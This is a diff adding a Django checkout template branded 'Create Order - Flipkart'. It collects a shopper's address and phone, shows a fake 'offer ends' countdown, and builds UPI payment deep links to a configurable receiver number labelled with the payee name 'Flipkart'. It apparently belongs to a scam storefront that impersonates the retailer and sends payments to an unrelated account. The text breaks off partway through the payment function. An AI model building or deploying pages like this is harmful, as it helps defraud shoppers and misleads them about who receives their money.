@@ -1,0 +1,1190 @@
+{% extends 'base.html' %}
+{% load static %}
+
+{% block title %}Create Order - Flipkart{% endblock %}
+
+{% block content %}
+<style>
+    header, .main-header, .navbar, .nav-bar, .fk-desktop-header, .fk-mobile-topbar, .fk-mobile-nav {
+        display: none !important;
+    }
+    body, html {
+        background: #0a0a0a !important;
+        margin: 0;
+        padding: 0 !important;
+    }
+</style>
+
+<div class="checkout-page">
+
+    <div id="screen1" class="container active">
+        <div class="app-header">
+            <span class="back-arrow" onclick="goBack()">←</span> 
+            <span class="header-title-text">Add delivery address</span>
+        </div>
+        
+        <div class="progress-tracker">
+            <div class="step active-step">
+                <div class="step-num">1</div>
+                <div class="step-label">Address</div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-label">Order Summary</div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-label">Payment</div>
+            </div>
+        </div>
+
+        <form method="POST" id="address-form" action="{% url 'orders:order_create' %}" novalidate>
+            {% csrf_token %}
+            
+            <div class="form-container">
+                <div class="input-group floating-group">
+                    <input type="text" name="full_name" class="input-field floating-input" 
+                           id="full_name" placeholder=" " required>
+                    <label for="full_name" class="floating-label">Full Name</label>
+                    <div class="error-message" data-for="full_name"></div>
+                </div>
+
+                <div class="input-group floating-group">
+                    <input type="tel" name="shipping_phone" class="input-field floating-input" 
+                           id="shipping_phone" placeholder=" " 
+                           value="{{ form.shipping_phone.value|default:'' }}" required>
+                    <label for="shipping_phone" class="floating-label">Mobile number</label>
+                    <div class="error-message" data-for="shipping_phone"></div>
+                </div>
+
+                <div class="input-group floating-group">
+                    <input type="text" name="shipping_postal_code" class="input-field floating-input" 
+                           id="shipping_postal_code" placeholder=" " 
+                           value="{{ form.shipping_postal_code.value|default:'' }}" required maxlength="6" minlength="6">
+                    <label for="shipping_postal_code" class="floating-label">Pincode</label>
+                    <div class="error-message" data-for="shipping_postal_code"></div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="input-group floating-group" style="flex: 1;">
+                        <input type="text" name="shipping_city" class="input-field floating-input" 
+                               id="shipping_city" placeholder=" " 
+                               value="{{ form.shipping_city.value|default:'' }}" required>
+                        <label for="shipping_city" class="floating-label">City</label>
+                        <div class="error-message" data-for="shipping_city"></div>
+                    </div>
+                    <div class="input-group floating-group inline-state-box" style="flex: 1;">
+                        <select name="shipping_state" class="input-field floating-input custom-select-arrow" id="shipping_state">
+                            <option value="">State</option>
+                            <option value="Andhra Pradesh">Andhra Pradesh</option>
+                            <option value="Bihar">Bihar</option>
+                            <option value="Delhi">Delhi</option>
+                            <option value="Gujarat">Gujarat</option>
+                            <option value="Karnataka">Karnataka</option>
+                            <option value="Kerala">Kerala</option>
+                            <option value="Madhya Pradesh">Madhya Pradesh</option>
+                            <option value="Maharashtra">Maharashtra</option>
+                            <option value="Rajasthan">Rajasthan</option>
+                            <option value="Tamil Nadu">Tamil Nadu</option>
+                            <option value="Uttar Pradesh">Uttar Pradesh</option>
+                            <option value="West Bengal">West Bengal</option>
+                            <option value="Other">Other</option>
+                        </select>
+                        <label for="shipping_state" class="floating-label">State</label>
+                    </div>
+                </div>
+
+                <div class="input-group floating-group">
+                    <input type="text" name="shipping_address" class="input-field floating-input" 
+                           id="shipping_address" placeholder=" " 
+                           value="{{ form.shipping_address.value|default:'' }}" required>
+                    <label for="shipping_address" class="floating-label">House No., Building Name</label>
+                    <div class="error-message" data-for="shipping_address"></div>
+                </div>
+
+                <div class="input-group floating-group">
+                    <input type="text" name="shipping_address_line2" class="input-field floating-input" 
+                           id="shipping_address_line2" placeholder=" " 
+                           value="{{ form.shipping_address_line2.value|default:'' }}">
+                    <label for="shipping_address_line2" class="floating-label">Road name, Area, Colony</label>
+                </div>
+            </div>
+
+            <button type="button" class="btn-proceed" onclick="goToStep(2)">
+                <span>Proceed</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </form>
+    </div>
+
+    <div id="screen2" class="container">
+        <div class="app-header">
+            <span class="back-arrow" onclick="goToStep(1)">←</span> 
+            <span class="header-title-text">Payments</span>
+        </div>
+        
+        <div class="progress-tracker">
+            <div class="step completed">
+                <div class="step-num">✓</div>
+                <div class="step-label">Address</div>
+            </div>
+            <div class="step completed">
+                <div class="step-num">✓</div>
+                <div class="step-label">Order Summary</div>
+            </div>
+            <div class="step active-step">
+                <div class="step-num">3</div>
+                <div class="step-label">Payment</div>
+            </div>
+        </div>
+
+        <div class="banner-container">
+            <div class="banner-slider">
+                {% for banner in active_banners %}
+                <div class="banner-slide {% if forloop.first %}active{% endif %}">
+                    {% if banner.get_image_url %}
+                    <img src="{{ banner.get_image_url }}" alt="{{ banner.title }}" class="banner-img">
+                    {% else %}
+                    <div class="banner-placeholder">
+                        <svg width="100%" height="160" viewBox="0 0 800 160" preserveAspectRatio="xMidYMid slice">
+                            <rect width="800" height="160" fill="#1a1a2e"/>
+                            <text x="400" y="90" text-anchor="middle" fill="#666" font-family="Arial" font-size="24">No Banner</text>
+                        </svg>
+                    </div>
+                    {% endif %}
+                    <div class="banner-overlay">
+                        {% if banner.tag_text %}
+                        <span class="banner-tag">{{ banner.tag_text }}</span>
+                        {% endif %}
+                        <span class="banner-text">{{ banner.title }}</span>
+                        {% if banner.subtitle %}
+                        <span class="banner-subtext">{{ banner.subtitle }}</span>
+                        {% endif %}
+                        <span class="banner-condition">*Condition Apply</span>
+                    </div>
+                </div>
+                {% empty %}
+                <div class="banner-slide active">
+                    <div class="banner-placeholder">
+                        <svg width="100%" height="160" viewBox="0 0 800 160" preserveAspectRatio="xMidYMid slice">
+                            <defs>
+                                <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="0%">
+                                    <stop offset="0%" style="stop-color:#f97316;stop-opacity:1" />
+                                    <stop offset="100%" style="stop-color:#ea580c;stop-opacity:1" />
+                                </linearGradient>
+                            </defs>
+                            <rect width="800" height="160" fill="url(#grad)"/>
+                            <text x="40" y="70" font-family="Arial, sans-serif" font-size="32" font-weight="bold" fill="white">GET 20% CASHBACK</text>
+                            <text x="40" y="105" font-family="Arial, sans-serif" font-size="18" fill="rgba(255,255,255,0.9)">when you pay with PhonePe UPI</text>
+                            <text x="40" y="135" font-family="Arial, sans-serif" font-size="14" fill="rgba(255,255,255,0.6)">*Condition Apply</text>
+                        </svg>
+                    </div>
+                    <div class="banner-overlay">
+                        <span class="banner-tag">🔥 Offer</span>
+                        <span class="banner-text">GET 20% CASHBACK</span>
+                        <span class="banner-subtext">when you pay with PhonePe UPI</span>
+                        <span class="banner-condition">*Condition Apply</span>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+
+        <div class="timer-container">
+            <i class="fas fa-clock timer-icon"></i>
+            <span>Offer ends in </span>
+            <span class="timer-countdown" id="offer-timer">06:16</span>
+        </div>
+
+        <div class="payment-method-section">
+            <div class="payment-methods-grid">
+                {% for method in payment_methods %}
+                <label class="payment-option" id="method-{{ method.id }}">
+                    <input type="radio" name="payment_method" value="{{ method.id }}" 
+                           id="pm-{{ method.id }}" 
+                           {% if forloop.first %}checked{% endif %}>
+                    <div class="payment-option-content">
+                        <div class="payment-option-logo">
+                            {% if method.name == 'phonepe' %}
+                            <svg width="40" height="40" viewBox="0 0 40 40">
+                                <rect width="40" height="40" rx="8" fill="#5f259f"/>
+                                <text x="20" y="25" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="11" font-weight="bold">PhonePe</text>
+                            </svg>
+                            {% elif method.name == 'paytm' %}
+                            <svg width="40" height="40" viewBox="0 0 40 40">
+                                <rect width="40" height="40" rx="8" fill="#00baf2"/>
+                                <text x="20" y="25" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="13" font-weight="bold">Paytm</text>
+                            </svg>
+                            {% else %}
+                            <svg width="40" height="40" viewBox="0 0 40 40">
+                                <rect width="40" height="40" rx="8" fill="#3b82f6"/>
+                                <text x="20" y="25" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="12" font-weight="bold">UPI</text>
+                            </svg>
+                            {% endif %}
+                        </div>
+                        <div class="payment-option-info">
+                            <span class="method-name">{{ method.get_name_display }}</span>
+                        </div>
+                        <div class="payment-option-check">
+                            <span class="check-circle">✓</span>
+                        </div>
+                    </div>
+                </label>
+                {% empty %}
+                <div class="text-center py-3 text-muted">
+                    <i class="fas fa-exclamation-circle"></i> No payment methods available
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+
+        <div class="price-details">
+            <div class="price-title">Price Details</div>
+            <div class="price-row">
+                <span>Price ({{ cart|length }} item)</span>
+                <span>₹{{ cart.get_total_price }}</span>
+            </div>
+            <div class="price-row">
+                <span>Delivery Charges</span>
+                <span class="free-text">FREE</span>
+            </div>
+            {% if applied_coupon %}
+            <div class="price-row discount">
+                <span>Coupon Discount</span>
+                <span>- ₹{{ applied_coupon.discount }}</span>
+            </div>
+            {% endif %}
+            <div class="price-divider"></div>
+            <div class="price-row total">
+                <span class="total-label">Total</span>
+                <span class="total-value">₹{{ cart.get_total_price }}</span>
+            </div>
+        </div>
+
+        <button class="btn-continue" onclick="processPayment()">
+            <span class="btn-price">₹{{ cart.get_total_price }}</span>
+            <span class="btn-text">Continue</span>
+            <i class="fas fa-arrow-right"></i>
+        </button>
+    </div>
+
+</div>
+
+<div class="modal-overlay" id="paymentModal">
+    <div class="modal-container">
+        <div class="modal-box">
+            <div class="modal-header">
+                <div class="modal-header-icon">
+                    <i class="fas fa-external-link-alt"></i>
+                </div>
+                <h4>You are leaving our app</h4>
+                <button class="modal-close" onclick="closeModal()">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="modal-body">
+                <p style="color: #bbbbbb; font-size: 14px; text-align: center; margin-bottom: 20px; line-height: 1.4;">
+                    The website you are viewing is trying to open an external application. Do you want to continue?
+                </p>
+                
+                <div class="modal-payment-info">
+                    <div class="modal-payment-method">
+                        <div class="modal-payment-logo" id="modal-method-logo">
+                            <div id="modal-logo-container"></div>
+                        </div>
+                        <div class="modal-payment-details">
+                            <span class="modal-label">Payment Method</span>
+                            <span class="modal-value" id="modal-method-name">PhonePe</span>
+                        </div>
+                    </div>
+                    
+                    <div class="modal-divider"></div>
+                    
+                    <div class="modal-amount-row">
+                        <span class="modal-label">Amount</span>
+                        <span class="modal-amount">₹{{ cart.get_total_price }}</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn-modal-cancel" onclick="closeModal()">Go Back</button>
+                <button class="btn-modal-confirm" onclick="confirmPayment()">Continue <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    /* ============================================================
+    CSS STYLING (Handoff-ready Deep Dark UI Layout)
+    ============================================================ */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body, html {
+        background: #0a0a0a !important;
+    }
+
+    .checkout-page {
+        background: #0a0a0a;
+        color: #ffffff;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+        padding: 16px;
+        max-width: 480px;
+        margin: 0 auto;
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 440px;
+        background: transparent;
+        display: none;
+        animation: fadeInUp 0.5s ease forwards;
+    }
+    .container.active {
+        display: block;
+    }
+
+    @keyframes fadeInUp {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ===== APP HEADER (Plain UI Match) ===== */
+    .app-header {
+        display: flex;
+        align-items: center;
+        padding: 14px 0 16px;
+        gap: 16px;
+        background: transparent;
+    }
+    .header-title-text {
+        color: #ffffff;
+        font-size: 19px;
+        font-weight: 500;
+    }
+    .back-arrow {
+        cursor: pointer;
+        font-size: 24px;
+        color: #ffffff;
+        display: inline-block;
+        font-weight: 400;
+        transition: opacity 0.2s;
+    }
+    .back-arrow:hover {
+        opacity: 0.7;
+    }
+
+    /* ===== PROGRESS TRACKER ===== */
+    .progress-tracker {
+        display: flex;
+        justify-content: space-between;
+        background: rgba(255,255,255,0.03);
+        padding: 14px 20px;
+        color: #666;
+        font-size: 11px;
+        text-align: center;
+        border-radius: 10px;
+        border: 1px solid rgba(255,255,255,0.05);
+        margin-bottom: 22px;
+        position: relative;
+    }
+    .progress-tracker::before {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 12%;
+        right: 12%;
+        height: 1.5px;
+        background: rgba(255,255,255,0.05);
+        transform: translateY(-50%);
+    }
+    .step {
+        flex: 1;
+        position: relative;
+        z-index: 1;
+    }
+    .step-num {
+        width: 24px;
+        height: 24px;
+        background: rgba(255,255,255,0.05);
+        border: 1.5px solid rgba(255,255,255,0.1);
+        color: #777;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 4px auto;
+        font-weight: 700;
+        font-size: 11px;
+        transition: all 0.3s ease;
+    }
+    .step.completed .step-num {
+        background: #10b981;
+        color: #fff;
+        border-color: #10b981;
+    }
+    .step.active-step .step-num {
+        background: #2874f0;
+        color: #fff;
+        border-color: #2874f0;
+    }
+    .step-label {
+        color: #666;
+        font-weight: 500;
+        font-size: 10px;
+    }
+    .step.active-step .step-label {
+        color: #2874f0;
+    }
+    .step.completed .step-label {
+        color: #10b981;
+    }
+
+    /* ===== DEEP DARK INPUT FIELDS ===== */
+    .floating-group {
+        position: relative;
+        margin-bottom: 18px;
+    }
+    .floating-input {
+        width: 100%;
+        background: #121212 !important;
+        border: 1px solid #222222 !important;
+        color: #ffffff !important;
+        padding: 20px 14px 6px 14px;
+        border-radius: 6px;
+        font-size: 15px;
+        outline: none;
+        height: 56px;
+        font-family: inherit;
+        transition: border-color 0.2s;
+    }
+    .floating-input:focus {
+        border-color: #2874f0 !important;
+    }
+    
+    .floating-input:focus + .floating-label,
+    .floating-input:not(:placeholder-shown) + .floating-label {
+        transform: translateY(-8px) scale(0.82);
+        color: #2874f0;
+        top: 8px;
+    }
+    .floating-input.error {
+        border-color: #ef4444 !important;
+    }
+    .floating-input.success {
+        border-color: #10b981 !important;
+    }
+    
+    .custom-select-arrow {
+        appearance: none;
+        cursor: pointer;
+    }
+    .inline-state-box::after {
+        content: '▼';
+        font-size: 10px;
+        color: #666;
+        position: absolute;
+        right: 14px;
+        top: 50%;
+        transform: translateY(-50%);
+        pointer-events: none;
+    }
+
+    .floating-label {
+        position: absolute;
+        left: 14px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #555555;
+        font-size: 15px;
+        transition: all 0.2s ease;
+        pointer-events: none;
+        font-weight: 400;
+    }
+
+    .error-message {
+        font-size: 12px;
+        color: #ef4444;
+        margin-top: 4px;
+        padding-left: 2px;
+        min-height: 16px;
+        opacity: 0;
+        transform: translateY(-3px);
+        transition: all 0.2s ease;
+    }
+    .error-message.show {
+        opacity: 1;
+        transform: translateY(0);
+    }
+
+    .form-row {
+        display: flex;
+        gap: 12px;
+    }
+
+    /* ===== BANNER LAYOUT ===== */
+    .banner-container {
+        width: 100%;
+        margin: 0 -16px;
+        width: calc(100% + 32px);
+        position: relative;
+        overflow: hidden;
+        background: transparent;
+    }
+    .banner-img {
+        width: 100%;
+        height: 150px !important;
+        object-fit: cover;
+        display: block;
+    }
+    .banner-placeholder {
+        width: 100%;
+        height: 150px;
+        display: block;
+        background: #15151a;
+    }
+    .banner-placeholder svg {
+        width: 100%;
+        height: 100%;
+        display: block;
+    }
+    .banner-overlay {
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: linear-gradient(90deg, rgba(0,0,0,0.2) 0%, transparent 70%);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        padding: 16px 24px;
+        pointer-events: none;
+    }
+    .banner-tag {
+        background: #ea580c;
+        padding: 2px 10px;
+        border-radius: 4px;
+        font-size: 10px;
+        font-weight: 700;
+        color: #fff;
+        display: inline-block;
+        margin-bottom: 4px;
+    }
+    .banner-text {
+        font-size: 24px;
+        font-weight: 700;
+        color: #fff;
+    }
+    .banner-subtext {
+        font-size: 14px;
+        color: rgba(255,255,255,0.9);
+        margin-top: 2px;
+    }
+    .banner-condition {
+        font-size: 11px;
+        color: rgba(255,255,255,0.4);
+        margin-top: 4px;
+    }
+
+    /* ===== TIMER ===== */
+    .timer-container {
+        text-align: center;
+        padding: 14px 0;
+        font-size: 14px;
+        color: #888;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+    }
+    .timer-icon {
+        color: #f97316;
+    }
+    .timer-countdown {
+        color: #f97316;
+        font-weight: 700;
+        background: rgba(249, 115, 22, 0.08);
+        padding: 2px 10px;
+        border-radius: 4px;
+    }
+
+    /* ===== PAYMENT SECTIONS ===== */
+    .payment-method-section {
+        margin-bottom: 20px;
+    }
+    .payment-methods-grid {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+    }
+    .payment-option {
+        cursor: pointer;
+        display: block;
+        margin: 0;
+    }
+    .payment-option input[type="radio"] {
+        display: none;
+    }
+    .payment-option-content {
+        background: #111111 !important;
+        border: 1px solid #222222 !important;
+        border-radius: 8px;
+        padding: 14px 16px;
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        transition: background 0.2s;
+    }
+    .payment-option-content:hover {
+        background: #161616 !important;
+    }
+
+    .payment-option input[type="radio"]:checked + .payment-option-content {
+        border-color: #2874f0 !important;
+    }
+    .payment-option input[type="radio"]:checked + .payment-option-content .payment-option-check {
+        opacity: 1;
+        transform: scale(1);
+    }
+
+    .payment-option-check {
+        margin-left: auto;
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        background: #2874f0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        transform: scale(0.6);
+        transition: all 0.2s ease;
+    }
+    .payment-option-check .check-circle {
+        color: #fff;
+        font-size: 10px;
+        font-weight: 700;
+    }
+
+    .payment-option-logo {
+        width: 38px;
+        height: 38px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .payment-option-info .method-name {
+        font-weight: 500;
+        font-size: 16px;
+        color: #ffffff;
+    }
+
+    /* ===== PRICE CARD ===== */
+    .price-details {
+        padding: 16px 0;
+        border-top: 1px dashed #222222;
+    }
+    .price-title {
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 12px;
+    }
+    .price-row {
+        display: flex;
+        justify-content: space-between;
+        padding: 4px 0;
+        font-size: 14px;
+        color: #aaaaaa;
+    }
+    .free-text, .price-row.discount {
+        color: #10b981;
+    }
+    .price-divider {
+        height: 1px;
+        background: #222222;
+        margin: 10px 0;
+    }
+    .price-row.total {
+        font-size: 16px;
+        font-weight: 600;
+        color: #fff;
+    }
+    .total-value {
+        color: #2874f0;
+        font-size: 19px;
+    }
+
+    /* ===== BOTTOM STICKY ACTIONS ===== */
+    .btn-continue, .btn-proceed {
+        background: #f1c40f;
+        color: #000000;
+        width: 100%;
+        padding: 14px 20px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        font-weight: 700;
+    }
+    .btn-continue .btn-price {
+        font-size: 18px;
+        font-weight: 700;
+        color: #000000;
+    }
+    .btn-continue .btn-text {
+        font-size: 15px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+    }
+    
+    .btn-proceed {
+        justify-content: center;
+        gap: 8px;
+        background: #ea580c;
+        color: #ffffff;
+        font-size: 16px;
+    }
+
+    /* ===== BRIGHT ENGLISH DARK MODAL ===== */
+    .modal-overlay {
+        display: none;
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.8);
+        z-index: 99999;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+    .modal-overlay.active {
+        display: flex;
+    }
+    .modal-container {
+        width: 100%;
+        max-width: 340px;
+    }
+    .modal-box {
+        background: #1c1c1e;
+        border-radius: 12px;
+        overflow: hidden;
+        border: 1px solid #2c2c2e;
+    }
+    .modal-header {
+        padding: 14px 16px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        border-bottom: 1px solid #2c2c2e;
+    }
+    .modal-header-icon {
+        color: #2874f0;
+        font-size: 14px;
+    }
+    .modal-header h4 {
+        font-size: 15px;
+        font-weight: 600;
+        color: #fff;
+        margin: 0;
+        flex: 1;
+    }
+    .modal-close {
+        background: transparent;
+        border: none;
+        color: #666;
+        cursor: pointer;
+        font-size: 14px;
+    }
+
+    .modal-body {
+        padding: 16px;
+    }
+    .modal-payment-info {
+        background: #2c2c2e;
+        border-radius: 6px;
+        padding: 12px;
+        margin-top: 4px;
+    }
+    .modal-payment-method {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding-bottom: 8px;
+    }
+    .modal-label {
+        font-size: 11px;
+        color: #8e8e93;
+    }
+    .modal-value {
+        font-size: 14px;
+        font-weight: 600;
+        color: #fff;
+    }
+    .modal-divider {
+        height: 1px;
+        background: #3a3a3c;
+        margin: 8px 0;
+    }
+    .modal-amount-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .modal-amount {
+        font-size: 18px;
+        font-weight: 700;
+        color: #2874f0;
+    }
+
+    .modal-footer {
+        padding: 12px 16px;
+        display: flex;
+        justify-content: flex-end;
+        gap: 16px;
+        border-top: 1px solid #2c2c2e;
+    }
+    .btn-modal-cancel {
+        background: transparent;
+        color: #8e8e93;
+        border: none;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    .btn-modal-confirm {
+        background: transparent;
+        color: #ffffff;
+        border: none;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+    }
+
+    /* TOAST INTERFACE */
+    .fk-toast-message {
+        position: fixed;
+        bottom: 80px;
+        left: 50%;
+        transform: translateX(-50%);
+        padding: 10px 20px;
+        border-radius: 8px;
+        color: white;
+        font-size: 13px;
+        z-index: 999999;
+        opacity: 0;
+        transition: opacity 0.3s;
+    }
+    .fk-toast-message.show { opacity: 1; }
+    .fk-toast-message.success { background: #10b981; }
+    .fk-toast-message.error { background: #ef4444; }
+    .fk-toast-message.info { background: #2874f0; }
+</style>
+
+<script>
+    var timerSeconds = 376;
+    var selectedMethodId = null;
+    var paymentMethods = {};
+    
+    {% for method in payment_methods %}
+    paymentMethods[{{ method.id }}] = {
+        id: {{ method.id }},
+        name: "{{ method.get_name_display }}",
+        type: "{{ method.name }}",
+        receiver: "{{ method.receiver_number }}",
+        instructions: "{{ method.instructions|escapejs }}"
+    };
+    {% endfor %}
+    
+    function goBack() {
+        if (document.getElementById('screen2').classList.contains('active')) {
+            goToStep(1);
+        } else {
+            window.history.back();
+        }
+    }
+    
+    function updateTimer() {
+        var minutes = Math.floor(timerSeconds / 60);
+        var seconds = timerSeconds % 60;
+        var el = document.getElementById('offer-timer');
+        if (el) {
+            el.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+        }
+        if (timerSeconds > 0) timerSeconds--;
+    }
+    
+    function validateField(input) {
+        var id = input.id;
+        var value = input.value.trim();
+        var errorEl = document.querySelector('.error-message[data-for="' + id + '"]');
+        
+        input.classList.remove('error', 'success');
+        if (errorEl) {
+            errorEl.classList.remove('show');
+            errorEl.textContent = '';
+        }
+        
+        if (!input.hasAttribute('required') && value === '') {
+            return true;
+        }
+        
+        var isValid = true;
+        var errorMsg = '';
+        
+        switch(id) {
+            case 'full_name':
+                if (value.length < 2) {
+                    isValid = false;
+                    errorMsg = 'Please enter your full name (min 2 characters)';
+                }
+                break;
+            case 'shipping_phone':
+                var phoneClean = value.replace(/[^0-9]/g, '');
+                if (phoneClean.length < 10) {
+                    isValid = false;
+                    errorMsg = 'Please enter a valid 10-digit phone number';
+                }
+                break;
+            case 'shipping_postal_code':
+                var pincodeClean = value.replace(/[^0-9]/g, '');
+                if (pincodeClean.length !== 6) {
+                    isValid = false;
+                    errorMsg = 'Please enter a valid 6-digit pincode';
+                }
+                break;
+            case 'shipping_city':
+                if (value.length < 2) {
+                    isValid = false;
+                    errorMsg = 'Please enter your city';
+                }
+                break;
+            case 'shipping_address':
+                if (value.length < 5) {
+                    isValid = false;
+                    errorMsg = 'Please enter your complete address';
+                }
+                break;
+            default:
+                if (value === '' && input.hasAttribute('required')) {
+                    isValid = false;
+                    errorMsg = 'This field is required';
+                }
+        }
+        
+        if (!isValid) {
+            input.classList.add('error');
+            if (errorEl) {
+                errorEl.textContent = errorMsg;
+                errorEl.classList.add('show');
+            }
+            return false;
+        } else if (value !== '' && input.hasAttribute('required')) {
+            input.classList.add('success');
+        }
+        return true;
+    }
+    
+    function selectPayment(methodId) {
+        var radio = document.getElementById('pm-' + methodId);
+        if (radio) {
+            radio.checked = true;
+        }
+        selectedMethodId = parseInt(methodId);
+        updatePaymentDisplay(selectedMethodId);
+    }
+    
+    function updatePaymentDisplay(methodId) {
+        var method = paymentMethods[methodId];
+        if (!method) return;
+        
+        document.getElementById('modal-method-name').textContent = method.name;
+        
+        var logoContainer = document.getElementById('modal-logo-container');
+        if (logoContainer) {
+            var svg = getPaymentLogoSVG(method.type);
+            logoContainer.innerHTML = svg;
+        }
+    }
+    
+    function getPaymentLogoSVG(type) {
+        var svgs = {
+            'phonepe': '<svg width="40" height="40" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#5f259f"/><text x="20" y="26" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="11" font-weight="bold">PhonePe</text></svg>',
+            'paytm': '<svg width="40" height="40" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#00baf2"/><text x="20" y="26" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="13" font-weight="bold">Paytm</text></svg>',
+            'upi': '<svg width="40" height="40" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#3b82f6"/><text x="20" y="26" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="12" font-weight="bold">UPI</text></svg>'
+        };
+        return svgs[type] || svgs['upi'];
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        var inputs = document.querySelectorAll('.floating-input[required]');
+        inputs.forEach(function(input) {
+            input.addEventListener('input', function() { validateField(this); });
+            input.addEventListener('blur', function() { validateField(this); });
+        });
+        
+        var phoneInput = document.getElementById('shipping_phone');
+        if (phoneInput) {
+            phoneInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9+]/g, '');
+            });
+        }
+        
+        var pincodeInput = document.getElementById('shipping_postal_code');
+        if (pincodeInput) {
+            pincodeInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+            });
+        }
+        
+        updateTimer();
+        setInterval(updateTimer, 1000);
+        
+        document.querySelectorAll('.payment-option input[type="radio"]').forEach(function(radio) {
+            radio.addEventListener('change', function() {
+                var methodId = this.value;
+                selectedMethodId = parseInt(methodId);
+                updatePaymentDisplay(selectedMethodId);
+            });
+        });
+        
+        var firstRadio = document.querySelector('input[name="payment_method"]');
+        if (firstRadio) {
+            var firstMethodId = firstRadio.value;
+            selectPayment(firstMethodId);
+        }
+        
+        document.getElementById('screen1').classList.add('active');
+    });
+    
+    function goToStep(step) {
+        if (step === 1) {
+            document.getElementById('screen1').classList.add('active');
+            document.getElementById('screen2').classList.remove('active');
+        } else if (step === 2) {
+            var inputs = document.querySelectorAll('#screen1 .floating-input[required]');
+            var allValid = true;
+            
+            inputs.forEach(function(input) {
+                if (!validateField(input)) {
+                    allValid = false;
+                }
+            });
+            
+            if (!allValid) {
+                showToast('❌ Please fill all required fields correctly', 'error');
+                var firstError = document.querySelector('.floating-input.error');
+                if (firstError) {
+                    firstError.focus();
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                return;
+            }
+            
+            var selected = document.querySelector('input[name="payment_method"]:checked');
+            if (!selected) {
+                showToast('❌ Please select a payment method', 'error');
+                return;
+            }
+            
+            selectedMethodId = parseInt(selected.value);
+            updatePaymentDisplay(selectedMethodId);
+            
+            document.getElementById('screen1').classList.remove('active');
+            document.getElementById('screen2').classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    }
+    
+    function processPayment() {
+        if (!selectedMethodId) {
+            showToast('❌ Please select a payment method', 'error');
+            return;
+        }
+        showModal();
+    }
+    
+    function showModal() {
+        var modal = document.getElementById('paymentModal');
+        if (modal) {
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+    }
+    
+    function closeModal() {
+        var modal = document.getElementById('paymentModal');
+        if (modal) {
+            modal.classList.remove('active');
+            document.body.style.overflow = '';
+        }
+    }
+    
+    document.getElementById('paymentModal')?.addEventListener('click', function(e) {
+        if (e.target === this) closeModal();
+    });
+    
+    function confirmPayment() {
+        var method = paymentMethods[selectedMethodId];
+        if (!method) {
+            showToast('❌ Invalid payment method', 'error');
+            return;
+        }
+        
+        var amount = '{{ cart.get_total_price }}';
+        var receiver = method.receiver;
+        var orderNumber = 'ORDER-' + Date.now();
+        
+        var appLinks = {
+            'phonepe': 'phonepe://pay?pa=' + receiver + '&pn=Flipkart&am=' + amount + '&cu=INR&tn=Order_' + orderNumber,
+            'googlepay': 'gpay://upi/pay?pa=' + receiver + '&pn=Flipkart&am=' + amount + '&cu=INR&tn=Order_' + orderNumber,
+            'paytm': 'paytmmp://pay?pa=' + receiver + '&pn=Flipkart&am=' + amount + '&cu=INR&tn=Order_' + orderNumber,
+            'upi': 'upi://pay?pa=' + receiver + '&pn=Flipkart&am=' + amount + '&cu=INR&tn=Order_' + orderNumber,
+        };
+        
